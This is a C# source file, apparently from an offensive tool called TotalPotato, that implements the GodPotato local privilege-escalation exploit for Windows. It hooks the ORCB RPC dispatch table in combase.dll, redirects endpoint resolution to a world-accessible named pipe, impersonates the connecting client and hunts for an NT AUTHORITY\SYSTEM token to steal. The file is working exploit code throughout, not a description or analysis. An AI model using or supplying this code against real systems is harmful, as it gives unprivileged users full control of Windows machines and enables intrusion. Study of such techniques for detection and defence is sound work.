using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using static TotalPotato.NativeAPI.NativeMethods;

namespace TotalPotato.NativeAPI
{
    public class GodPotatoContext
    {
        private static readonly Guid orcbRPCGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");
        public nint CombaseModule { get; private set; }
        public nint DispatchTablePtr { get; private set; }
        public nint UseProtseqFunctionPtr { get; private set; } = nint.Zero;
        public uint UseProtseqFunctionParamCount { get; private set; } = 0xffffff;

        private NewOrcbRPC newOrcbRPC;
        private nint[] dispatchTable = null;
        private short[] fmtStringOffsetTable = null;
        private nint procString = nint.Zero;
        private Delegate useProtseqDelegate;
        private WindowsIdentity systemIdentity;
        private Thread pipeServerThread;
        public TextWriter ConsoleWriter { get; private set; }
        public string PipeName { get; set; }
        public bool IsStart { get; private set; }
        public bool IsHook { get; private set; }

        public GodPotatoContext(TextWriter consoleWriter, string pipeName)
        {
            PipeName = pipeName;
            newOrcbRPC = new NewOrcbRPC(this);
            ConsoleWriter = consoleWriter;

            InitContext();

            if (CombaseModule == nint.Zero)
            {
                throw new Exception("No combase module found");
            }
            else if (dispatchTable == null || procString == nint.Zero || UseProtseqFunctionPtr == nint.Zero)
            {
                throw new Exception("Cannot find IDL structure");
            }


            string delegateFunName = "delegateFun" + UseProtseqFunctionParamCount;
            string funName = "fun" + UseProtseqFunctionParamCount;

            Type delegateFunType = typeof(NewOrcbRPC).GetNestedType(delegateFunName, System.Reflection.BindingFlags.Public);

            useProtseqDelegate = Delegate.CreateDelegate(delegateFunType, newOrcbRPC, funName);

        }

        protected void InitContext()
        {
            ProcessModuleCollection processModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule processModule in processModules)
            {
                if (processModule.ModuleName != null && processModule.ModuleName.ToLower() == "combase.dll")
                {
                    CombaseModule = processModule.BaseAddress;

                    MemoryStream patternStream = new MemoryStream();

                    BinaryWriter binaryWriter = new BinaryWriter(patternStream);
                    binaryWriter.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                    binaryWriter.Write(orcbRPCGuid.ToByteArray());
                    binaryWriter.Flush();

                    byte[] dllContent = new byte[processModule.ModuleMemorySize];
                    Marshal.Copy(processModule.BaseAddress, dllContent, 0, dllContent.Length);

                    var s = Sunday.Search(dllContent, patternStream.ToArray());


                    RPC_SERVER_INTERFACE rpcServerInterface = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(new nint(processModule.BaseAddress.ToInt64() + s[0]), typeof(RPC_SERVER_INTERFACE));
                    RPC_DISPATCH_TABLE rpcDispatchTable = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(rpcServerInterface.DispatchTable, typeof(RPC_DISPATCH_TABLE));
                    MIDL_SERVER_INFO midlServerInfo = (MIDL_SERVER_INFO)Marshal.PtrToStructure(rpcServerInterface.InterpreterInfo, typeof(MIDL_SERVER_INFO));
                    DispatchTablePtr = midlServerInfo.DispatchTable;
                    nint fmtStringOffsetTablePtr = midlServerInfo.FmtStringOffset;
                    procString = midlServerInfo.ProcString;
                    dispatchTable = new nint[rpcDispatchTable.DispatchTableCount];
                    fmtStringOffsetTable = new short[rpcDispatchTable.DispatchTableCount];

                    for (int i = 0; i < dispatchTable.Length; i++)
                    {
                        dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * nint.Size);
                    }

                    for (int i = 0; i < fmtStringOffsetTable.Length; i++)
                    {
                        fmtStringOffsetTable[i] = Marshal.ReadInt16(fmtStringOffsetTablePtr, i * Marshal.SizeOf(typeof(short)));
                    }
                    UseProtseqFunctionPtr = dispatchTable[0];
                    UseProtseqFunctionParamCount = Marshal.ReadByte(procString, fmtStringOffsetTable[0] + 19);
                }
            }

        }

        protected void PipeServer()
        {
            nint pipeServerHandle = BAD_HANLE;

            nint securityDescriptor;
            uint securityDescriptorSize;

            ConvertStringSecurityDescriptorToSecurityDescriptor("D:(A;OICI;GA;;;WD)", 1, out securityDescriptor, out securityDescriptorSize);

            try
            {

                string serverPipe = $"\\\\.\\pipe\\{PipeName}\\pipe\\epmapper";
                SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();
                securityAttributes.pSecurityDescriptor = securityDescriptor;
                securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                pipeServerHandle = CreateNamedPipe(serverPipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 521, 0, 123, ref securityAttributes);

                ConsoleWriter.WriteLine("[*] CreateNamedPipe " + serverPipe);
                if (pipeServerHandle != BAD_HANLE)
                {

                    if (ConnectNamedPipe(pipeServerHandle, nint.Zero))
                    {
                        ConsoleWriter.WriteLine("[*] Pipe Connected!");
                        if (ImpersonateNamedPipeClient(pipeServerHandle))
                        {
                            systemIdentity = WindowsIdentity.GetCurrent();
                            if (systemIdentity.ImpersonationLevel <= TokenImpersonationLevel.Identification)
                            {
                                RevertToSelf();
                            }

                            ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                            ConsoleWriter.WriteLine("[*] CurrentsImpersonationLevel: " + systemIdentity.ImpersonationLevel);

                            ConsoleWriter.WriteLine("[*] Start Search System Token");

                            bool isFindSystemToken = false;

                            if (systemIdentity.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                            {
                                SharpToken.TokenuUils.ListProcessTokens(-1, processToken =>
                                {
                                    if (processToken.UserName == "NT AUTHORITY\\SYSTEM" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.IntegrityLevel >= SharpToken.IntegrityLevel.SystemIntegrity)
                                    {
                                        systemIdentity = new WindowsIdentity(processToken.TokenHandle);
                                        ConsoleWriter.WriteLine("[*] PID : {0} Token:0x{1:x}  User: {2} ImpersonationLevel: {3}", processToken.TargetProcessId, processToken.TargetProcessToken, processToken.UserName, processToken.ImpersonationLevel);
                                        isFindSystemToken = true;
                                        processToken.Close();
                                        return false;
                                    }
                                    processToken.Close();
                                    return true;
                                });
                            }

                            ConsoleWriter.WriteLine("[*] Find System Token : " + isFindSystemToken);

                            RevertToSelf();
                        }
                        else
                        {
                            ConsoleWriter.WriteLine($"[!] ImpersonateNamedPipeClient fail error:{Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        ConsoleWriter.WriteLine("[!] ConnectNamedPipe timeout");
                    }

                }
                else
                {
                    ConsoleWriter.WriteLine($"[!] CreateNamedPipe fail error:{Marshal.GetLastWin32Error()}");
                }
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);
            }
            finally
            {
                if (pipeServerHandle != BAD_HANLE)
                {
                    CloseHandle(pipeServerHandle);
                }

            }
            return;
        }

        public void Start()
        {
            if (IsHook && !IsStart)
            {
                pipeServerThread = new Thread(PipeServer);
                pipeServerThread.IsBackground = true;
                pipeServerThread.Start();
                IsStart = true;
            }
            else
            {
                throw new Exception("IsHook == false");
            }

        }

        public void HookRPC()
        {
            uint old;
            VirtualProtect(DispatchTablePtr, (uint)(nint.Size * dispatchTable.Length), 0x04, out old);
            Marshal.WriteIntPtr(DispatchTablePtr, Marshal.GetFunctionPointerForDelegate(useProtseqDelegate));
            IsHook = true;
        }
        public void Restore()
        {
            if (IsHook)
            {
                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFunctionPtr);
            }
            else
            {
                throw new Exception("IsHook == false");
            }
        }
        public void Stop()
        {
            if (IsStart)
            {
                if (pipeServerThread.IsAlive)
                {
                    pipeServerThread.Interrupt();
                    pipeServerThread.Abort();
                }
                IsStart = false;
            }
            else
            {
                throw new Exception("IsStart == false");
            }
        }

        public WindowsIdentity GetToken()
        {
            return systemIdentity;
        }

    }

    class NewOrcbRPC
    {
        private GodPotatoContext godPotatoContext;
        public NewOrcbRPC(GodPotatoContext godPotatoContext)
        {
            this.godPotatoContext = godPotatoContext;
        }
        public int fun(nint ppdsaNewBindings, nint ppdsaNewSecurity)
        {
            string[] endpoints = { $"ncacn_np:localhost/pipe/{godPotatoContext.PipeName}[\\pipe\\epmapper]", "ncacn_ip_tcp:fuck you !" };

            int entrieSize = 3;
            for (int i = 0; i < endpoints.Length; i++)
            {
                entrieSize += endpoints[i].Length;
                entrieSize++;
            }

            int memroySize = entrieSize * 2 + 10;

            nint pdsaNewBindings = Marshal.AllocHGlobal(memroySize);

            for (int i = 0; i < memroySize; i++)
            {
                Marshal.WriteByte(pdsaNewBindings, i, 0x00);
            }

            int offset = 0;

            Marshal.WriteInt16(pdsaNewBindings, offset, (short)entrieSize);
            offset += 2;
            Marshal.WriteInt16(pdsaNewBindings, offset, (short)(entrieSize - 2));
            offset += 2;

            for (int i = 0; i < endpoints.Length; i++)
            {
                string endpoint = endpoints[i];
                for (int j = 0; j < endpoint.Length; j++)
                {
                    Marshal.WriteInt16(pdsaNewBindings, offset, (short)endpoint[j]);
                    offset += 2;
                }
                offset += 2;
            }
            Marshal.WriteIntPtr(ppdsaNewBindings, pdsaNewBindings);

            return 0;
        }
        public delegate int delegateFun4(nint p0, nint p1, nint p2, nint p3);
        public delegate int delegateFun5(nint p0, nint p1, nint p2, nint p3, nint p4);
        public delegate int delegateFun6(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5);
        public delegate int delegateFun7(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6);
        public delegate int delegateFun8(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7);
        public delegate int delegateFun9(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8);
        public delegate int delegateFun10(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9);
        public delegate int delegateFun11(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10);
        public delegate int delegateFun12(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11);
        public delegate int delegateFun13(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11, nint p12);
        public delegate int delegateFun14(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11, nint p12, nint p13);
        public int fun4(nint p0, nint p1, nint p2, nint p3)
        {
            return fun(p2, p3);
        }
        public int fun5(nint p0, nint p1, nint p2, nint p3, nint p4)
        {
            return fun(p3, p4);
        }
        public int fun6(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5)
        {
            return fun(p4, p5);
        }
        public int fun7(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6)
        {
            return fun(p5, p6);
        }
        public int fun8(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7)
        {
            return fun(p6, p7);
        }
        public int fun9(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8)
        {
            return fun(p7, p8);
        }
        public int fun10(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9)
        {
            return fun(p8, p9);
        }
        public int fun11(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10)
        {
            return fun(p9, p10);
        }
        public int fun12(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11)
        {
            return fun(p10, p11);
        }
        public int fun13(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11, nint p12)
        {
            return fun(p11, p12);
        }
        public int fun14(nint p0, nint p1, nint p2, nint p3, nint p4, nint p5, nint p6, nint p7, nint p8, nint p9, nint p10, nint p11, nint p12, nint p13)
        {
            return fun(p12, p13);
        }


    }
    class Sunday
    {
        private static int ALPHA_BET = 512;

        private static int[] ComputeOccurence(byte[] pattern)
        {
            int[] table = new int[ALPHA_BET];
            for (char a = (char)0; a < (char)ALPHA_BET; a++)
            {
                table[a] = -1;
            }

            for (int i = 0; i < pattern.Length; i++)
            {
                byte a = pattern[i];
                table[a] = i;
            }
            return table;
        }

        public static List<int> Search(byte[] text, byte[] pattern)
        {
            List<int> matchs = new List<int>();

            int i = 0;
            int[] table = ComputeOccurence(pattern);
            while (i <= text.Length - pattern.Length)
            {
                int j = 0;
                while (j < pattern.Length && text[i + j] == pattern[j])
                {
                    j++;
                }
                if (j == pattern.Length)
                {
                    matchs.Add(i);
                }
                i += pattern.Length;
                if (i < text.Length)
                {
                    i -= table[text[i]];
                }
            }
            return matchs;
        }
    }

}
